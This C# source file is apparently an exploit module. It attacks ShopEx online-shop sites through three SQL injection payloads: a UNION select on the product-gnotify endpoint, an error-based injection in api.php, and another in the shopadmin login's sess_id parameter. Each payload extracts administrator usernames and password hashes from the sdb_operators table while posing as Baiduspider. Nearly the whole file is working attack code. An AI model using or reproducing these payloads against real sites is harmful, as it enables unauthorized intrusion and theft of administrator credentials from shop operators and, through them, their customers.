using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class shopex
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string jieguourl = urls + "/?product-gnotify";
				string zhuru33 = this.zhuru3(urls);
				if (zhuru33 != "网站未发现安全隐患")
				{
					result = zhuru33;
				}
				else
				{
					string jieguo = this.shujuhuoqu(jieguourl);
					if (jieguo == "网站未发现安全隐患")
					{
						string zuixinzhurujieguo = this.zuixinzhuru(urls);
						if (zuixinzhurujieguo != "网站未发现安全隐患")
						{
							result = zuixinzhurujieguo;
						}
						else
						{
							result = "网站未发现安全隐患";
						}
					}
					else
					{
						result = jieguo;
					}
				}
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
		public string shujuhuoqu(string url)
		{
			string result;
			try
			{
				string postString = "goods[goods_id]=3&goods[product_id]=1 and 1=2 union select 1,2,3,4,5,6,7,8,concat(0x245E,username,0x2D3E,userpass,0x5E24,0x20203C7370616E207374796C653D22636F6C6F723A20236666303030303B223E5430306C732E4E657420476F21476F21476F213C2F7370616E3E),10,11,12,13,14,15,16,17,18,19,20,21,22 from sdb_operators";
				byte[] postData = Encoding.UTF8.GetBytes(postString);
				byte[] responseData = new WebClient
				{
					Headers = 
					{

						{
							"Content-Type",
							"application/x-www-form-urlencoded"
						},

						{
							"user-agent",
							"Baiduspider"
						}
					}
				}.UploadData(url, postData);
				string scrString = Encoding.UTF8.GetString(responseData);
				int kaishi = scrString.IndexOf("$^");
				string shuju = scrString.Substring(kaishi + 2, 100);
				string jieguo = shuju.Substring(0, shuju.IndexOf("^$"));
				result = jieguo;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
		public string zuixinzhuru(string url)
		{
			string result;
			try
			{
				string postString = "act=search_sub_regions&api_version=1.0&return_data=string&p_region_id=22 and (select 1 from(select count(*),concat(0x7c,(select concat(0x245E,username,0x2D3E,userpass,0x5E24) from sdb_operators limit 0,1),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)#";
				byte[] postData = Encoding.UTF8.GetBytes(postString);
				string urls = url + "/api.php";
				byte[] responseData = new WebClient
				{
					Headers = 
					{

						{
							"Content-Type",
							"application/x-www-form-urlencoded"
						},

						{
							"user-agent",
							"Baiduspider"
						}
					}
				}.UploadData(urls, postData);
				string scrString = Encoding.UTF8.GetString(responseData);
				int kaishi = scrString.IndexOf("$^");
				string shuju = scrString.Substring(kaishi + 2, 50);
				string jieguo = shuju.Substring(0, shuju.IndexOf("^$"));
				result = jieguo;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
		public string zhuru3(string url)
		{
			string result;
			try
			{
				WebClient cli = new WebClient();
				string urls = url + "/shopadmin/index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1";
				cli.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
				cli.Headers.Add("user-agent", "Baiduspider");
				string shuju = cli.DownloadString(urls);
				int kaishi = shuju.IndexOf("Duplicate entry");
				string shujus = shuju.Substring(kaishi + 17, 80);
				if (shujus.Contains("~"))
				{
					result = shujus;
				}
				else
				{
					if (shujus.Contains("INSERT"))
					{
						result = "网站未发现安全隐患";
					}
					else
					{
						if (shujus.Contains("SELECT"))
						{
							result = "网站未发现安全隐患";
						}
						else
						{
							if (shujus.Contains("<meta"))
							{
								result = "网站未发现安全隐患";
							}
							else
							{
								result = "网站未发现安全隐患";
							}
						}
					}
				}
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
